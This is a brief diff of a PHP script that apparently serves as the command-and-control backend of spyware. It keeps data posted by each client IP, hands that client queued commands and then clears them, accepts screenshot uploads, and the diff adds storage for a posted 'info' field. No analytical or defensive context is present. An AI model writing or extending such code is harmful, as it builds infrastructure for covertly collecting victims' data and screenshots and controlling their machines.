@@ -4,12 +4,16 @@ $ip = $_SERVER['REMOTE_ADDR'];
 
 $file_data = 'data/' . $ip;
 $file_cmds = 'commands/' . $ip;
+$file_info = 'info/' . $ip;
 
 if (isset($_POST['d'])) {
 	file_put_contents($file_data, file_get_contents($file_data) . $_POST['d']);
 
 	echo file_get_contents($file_cmds);
 	file_put_contents($file_cmds, '');
+}
+if (isset($_POST['i'])) {
+	file_put_contents($file_info, $_POST['i']);
 }
 else if (isset($_FILES['s'])) {
 	$uploaddir = 'screenshots/';
